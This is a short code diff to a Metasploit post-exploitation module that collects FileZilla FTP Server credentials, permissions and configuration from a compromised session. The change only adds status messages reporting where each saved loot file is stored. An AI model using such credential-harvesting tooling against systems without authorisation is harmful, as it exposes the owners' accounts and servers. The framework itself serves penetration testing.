@@ -198,14 +198,20 @@ class Metasploit3 < Msf::Post
 				:target_port => config['admin_port']
 			)
 
-		store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
+		p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
 			"filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
 
-		store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
+		print_status("Credentials saved in: #{p.to_s}")
+
+		p = store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
 			"filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
 
-		store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
+		print_status("Permissions saved in: #{p.to_s}")
+
+		p = store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
 			"filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
+
+		print_status("Config saved in: #{p.to_s}")
 	end
 
 	def parse_server(data)
